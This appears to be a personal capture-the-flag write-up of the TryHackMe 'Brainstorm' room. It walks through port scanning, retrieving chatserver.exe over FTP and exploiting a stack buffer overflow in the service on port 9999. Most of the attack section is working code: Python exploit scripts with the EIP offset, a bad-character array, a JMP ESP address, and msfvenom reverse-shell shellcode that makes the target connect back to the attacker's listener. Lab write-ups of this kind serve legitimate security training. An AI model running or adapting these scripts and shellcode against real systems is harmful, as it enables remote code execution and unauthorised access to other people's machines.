---
title: Box - Brainstorm
published: true
---

Penetration Testing Challenge

[https://tryhackme.com/room/internal](https://tryhackme.com/room/internal)

![0xskar](/assets/hacker-900-350.jpg)

* * *

## Task 1 - Deploy Machine and Scan Network 

Blocking our ping probes...

- ``sudo nmap -Pn -sS -T4 -p- 10.10.149.246 -vvv``
- ``nmap -sC -sV -T4 10.10.103.228 -p3389,21,9999 -Pn -vvv``

- Port 21 FTP
- Port 3389 Windows RDP
- Port 9999 Brainstorm Char

##   Answer the questions below

**How many ports are open?**

- 

* * *

## Task 2 Accessing Files

Let's continue with the enumeration!

- Looking inside port 21 we find chatserver.exe 

##   Answer the questions below

**What is the name of the exe file you found?**

- chatserver.exe

* * *

## Task 3 - Access

**After enumeration, you now must have noticed that the service interacting on the strange port is some how related to the files you found! Is there anyway you can exploit that strange service to gain access to the system?**

- Setup Immunity Debugger and Mona in Kali VM and lets try to buffer overflow following our steps from [Buffer Overflow Prep](https://0xskar.github.io/TryHackMe-Buffer-Overflow-Prep), [Tib3rius Cheatsheet](https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst)
- On our windows 7 32 bit vm download chatserver.exe and set it to bridged in vmware in order to avoid filtered port states.

**It is worth using a Python script to try out different payloads to gain access! You can even use the files to locally try the exploit.**

- Maybe [tib3reus](https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst) can help me..

- I know no python. I need to learn python.

##   Answer the questions below

Read the description.

**After testing for overflow, by entering a large number of characters, determine the EIP offset.**

- Set working folder in Immunity. ``!mona config -set workingfolder c:\mona\%p``
- Create a.py with ``print ("A" *5000)`` and then ``python3 a.py`` and paste into netcat ``nc -nv 192.168.0.24 9999``
- The EIP Register should be overwritten by A's (\x41) this is great we also have EBP overwritten. If we can control and overwrite the EIP we can control and point to something malicious. 
- ``msf-pattern_create -l 5000`` and send in netcat 
- note this code overwrites the EAX the ESP and the EIP. **note the EIP 31704330**
- ``msf-pattern_offset -l 5000 -q 31704330``
- exact match at offset 2012 as long as this finds a exact match we are good to go.

```python
import socket
import sys

username = b"oskar"
message = b"A" * 2012 + b"B" * 4

try:
      print("Sending Payload...")
      s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
      s.connect(('192.168.0.24',9999))
      s.recv(1024)
      s.recv(1024)
      s.send(username + b'\r\n')
      s.recv(1024)
      s.send(message + b'\r\n')
      s.recv(1024)
      s.close()

except:
      print("Cannot connect to the server")
      sys.exit()
```

- we control the EIP when its overwritten with the 4 B's 42424242
- find badchars
- https://github.com/cytopia/badchars
- update our code with the badchars variable

```python
import socket
import sys

username = b"oskar"
message = b"A" * 2012 + b"B" * 4
badchars = (
  b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
  b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
  b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
  b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
  b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
  b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
  b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
  b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
  b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
  b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
  b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
  b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
  b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
  b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
  b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

try:
      print("Sending Payload...")
      s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
      s.connect(('192.168.0.24',9999))
      s.recv(1024)
      s.recv(1024)
      s.send(username + b'\r\n')
      s.recv(1024)
      s.send(message + badchars + b'\r\n')
      s.recv(1024)
      s.close()

except:
      print("Cannot connect to the server")
      sys.exit()
```

- run and program should crash
- right click on ESP and follow in dump

**Now you know that you can overflow a buffer and potentially control execution, you need to find a function where ASLR/DEP is not enabled. Why not check the DLL file.**

- !mona modules - will find protection modules. We are looking for falses straight accross
- We can see that chatserver.exe and essfunc.dll give us falses straight accross.
- !mona find -s "\xff\xe4" -m essfunc.dll
- this finds us our jump point
- 625014DF

```python
import socket
import sys

username = b"oskar"
message = b"A" * 2012 + b"\xdf\x14\x50\x62"
payload = b""

try:
      print("Sending Payload...")
      s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
      s.connect(('192.168.0.24',9999))
      s.recv(1024)
      s.recv(1024)
      s.send(username + b'\r\n')
      s.recv(1024)
      s.send(message + badchars + b'\r\n')
      s.recv(1024)
      s.close()

except:
      print("Cannot connect to the server")
      sys.exit()
```

- breakpoint at essfunc.625014DF 
- now we can generate shellcode

**Since this would work, you can try generate some shellcode - use msfvenom to generate shellcode for windows.**

- ``msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.23 LPORT=7777 -b "\x00" -f c``

```shell
import socket
import sys

username = b"oskar"
message = b"A" * 2012 + b"\xdf\x14\x50\x62" + b"\x90" * 32
payload = (b"\xbd\x5c\x4a\x35\x2e\xd9\xcd\xd9\x74\x24\xf4\x5e\x33\xc9\xb1"
b"\x52\x31\x6e\x12\x03\x6e\x12\x83\xb2\xb6\xd7\xdb\xb6\xaf\x9a"
b"\x24\x46\x30\xfb\xad\xa3\x01\x3b\xc9\xa0\x32\x8b\x99\xe4\xbe"
b"\x60\xcf\x1c\x34\x04\xd8\x13\xfd\xa3\x3e\x1a\xfe\x98\x03\x3d"
b"\x7c\xe3\x57\x9d\xbd\x2c\xaa\xdc\xfa\x51\x47\x8c\x53\x1d\xfa"
b"\x20\xd7\x6b\xc7\xcb\xab\x7a\x4f\x28\x7b\x7c\x7e\xff\xf7\x27"
b"\xa0\xfe\xd4\x53\xe9\x18\x38\x59\xa3\x93\x8a\x15\x32\x75\xc3"
b"\xd6\x99\xb8\xeb\x24\xe3\xfd\xcc\xd6\x96\xf7\x2e\x6a\xa1\xcc"
b"\x4d\xb0\x24\xd6\xf6\x33\x9e\x32\x06\x97\x79\xb1\x04\x5c\x0d"
b"\x9d\x08\x63\xc2\x96\x35\xe8\xe5\x78\xbc\xaa\xc1\x5c\xe4\x69"
b"\x6b\xc5\x40\xdf\x94\x15\x2b\x80\x30\x5e\xc6\xd5\x48\x3d\x8f"
b"\x1a\x61\xbd\x4f\x35\xf2\xce\x7d\x9a\xa8\x58\xce\x53\x77\x9f"
b"\x31\x4e\xcf\x0f\xcc\x71\x30\x06\x0b\x25\x60\x30\xba\x46\xeb"
b"\xc0\x43\x93\xbc\x90\xeb\x4c\x7d\x40\x4c\x3d\x15\x8a\x43\x62"
b"\x05\xb5\x89\x0b\xac\x4c\x5a\xf4\x99\x4e\x8d\x9c\xdb\x4e\xaf"
b"\x3d\x55\xa8\xa5\xad\x33\x63\x52\x57\x1e\xff\xc3\x98\xb4\x7a"
b"\xc3\x13\x3b\x7b\x8a\xd3\x36\x6f\x7b\x14\x0d\xcd\x2a\x2b\xbb"
b"\x79\xb0\xbe\x20\x79\xbf\xa2\xfe\x2e\xe8\x15\xf7\xba\x04\x0f"
b"\xa1\xd8\xd4\xc9\x8a\x58\x03\x2a\x14\x61\xc6\x16\x32\x71\x1e"
b"\x96\x7e\x25\xce\xc1\x28\x93\xa8\xbb\x9a\x4d\x63\x17\x75\x19"
b"\xf2\x5b\x46\x5f\xfb\xb1\x30\xbf\x4a\x6c\x05\xc0\x63\xf8\x81"
b"\xb9\x99\x98\x6e\x10\x1a\xa8\x24\x38\x0b\x21\xe1\xa9\x09\x2c"
b"\x12\x04\x4d\x49\x91\xac\x2e\xae\x89\xc5\x2b\xea\x0d\x36\x46"
b"\x63\xf8\x38\xf5\x84\x29")

try:
      print("Sending Payload...")
      s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
      s.connect(('192.168.0.24',9999))
      s.recv(1024)
      s.recv(1024)
      s.send(username + b'\r\n')
      s.recv(1024)
      s.send(message + payload + b'\r\n')
      s.recv(1024)
      s.close()

except:
      print("Cannot connect to the server")
      sys.exit()
```

This gives us shell now we can change these to work on the target.

**After gaining access, what is the content of the root.txt file?**

- ``msfvenom -p windows/shell_reverse_tcp LHOST=10.x.x.x LPORT=7777 -b "\x00" -f c``

- adjust our payload to suit

```python
import socket
import sys

username = b"oskar"
message = b"A" * 2012 + b"\xdf\x14\x50\x62" + b"\x90" * 32
payload = (b"\xdd\xc4\xd9\x74\x24\xf4\x5e\xba\x5a\x94\x76\xdd\x2b\xc9\xb1"
b"\x52\x31\x56\x17\x83\xee\xfc\x03\x0c\x87\x94\x28\x4c\x4f\xda"
b"\xd3\xac\x90\xbb\x5a\x49\xa1\xfb\x39\x1a\x92\xcb\x4a\x4e\x1f"
b"\xa7\x1f\x7a\x94\xc5\xb7\x8d\x1d\x63\xee\xa0\x9e\xd8\xd2\xa3"
b"\x1c\x23\x07\x03\x1c\xec\x5a\x42\x59\x11\x96\x16\x32\x5d\x05"
b"\x86\x37\x2b\x96\x2d\x0b\xbd\x9e\xd2\xdc\xbc\x8f\x45\x56\xe7"
b"\x0f\x64\xbb\x93\x19\x7e\xd8\x9e\xd0\xf5\x2a\x54\xe3\xdf\x62"
b"\x95\x48\x1e\x4b\x64\x90\x67\x6c\x97\xe7\x91\x8e\x2a\xf0\x66"
b"\xec\xf0\x75\x7c\x56\x72\x2d\x58\x66\x57\xa8\x2b\x64\x1c\xbe"
b"\x73\x69\xa3\x13\x08\x95\x28\x92\xde\x1f\x6a\xb1\xfa\x44\x28"
b"\xd8\x5b\x21\x9f\xe5\xbb\x8a\x40\x40\xb0\x27\x94\xf9\x9b\x2f"
b"\x59\x30\x23\xb0\xf5\x43\x50\x82\x5a\xf8\xfe\xae\x13\x26\xf9"
b"\xd1\x09\x9e\x95\x2f\xb2\xdf\xbc\xeb\xe6\x8f\xd6\xda\x86\x5b"
b"\x26\xe2\x52\xcb\x76\x4c\x0d\xac\x26\x2c\xfd\x44\x2c\xa3\x22"
b"\x74\x4f\x69\x4b\x1f\xaa\xfa\x7e\xe2\xcb\x1b\x16\xe0\x33\xc2"
b"\x86\x6d\xd5\x90\x58\x38\x4e\x0d\xc0\x61\x04\xac\x0d\xbc\x61"
b"\xee\x86\x33\x96\xa1\x6e\x39\x84\x56\x9f\x74\xf6\xf1\xa0\xa2"
b"\x9e\x9e\x33\x29\x5e\xe8\x2f\xe6\x09\xbd\x9e\xff\xdf\x53\xb8"
b"\xa9\xfd\xa9\x5c\x91\x45\x76\x9d\x1c\x44\xfb\x99\x3a\x56\xc5"
b"\x22\x07\x02\x99\x74\xd1\xfc\x5f\x2f\x93\x56\x36\x9c\x7d\x3e"
b"\xcf\xee\xbd\x38\xd0\x3a\x48\xa4\x61\x93\x0d\xdb\x4e\x73\x9a"
b"\xa4\xb2\xe3\x65\x7f\x77\x13\x2c\xdd\xde\xbc\xe9\xb4\x62\xa1"
b"\x09\x63\xa0\xdc\x89\x81\x59\x1b\x91\xe0\x5c\x67\x15\x19\x2d"
b"\xf8\xf0\x1d\x82\xf9\xd0")

try:
      print("Sending Payload...")
      s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
      s.connect(('10.10.203.108',9999))
      s.recv(1024)
      s.recv(1024)
      s.send(username + b'\r\n')
      s.recv(1024)
      s.send(message + payload + b'\r\n')
      s.recv(1024)
      s.close()

except:
      print("Cannot connect to the server")
      sys.exit()
```

- send through payload with netcat listener setup to gain shell

- our root.txt is on desktop of drake

* * * 
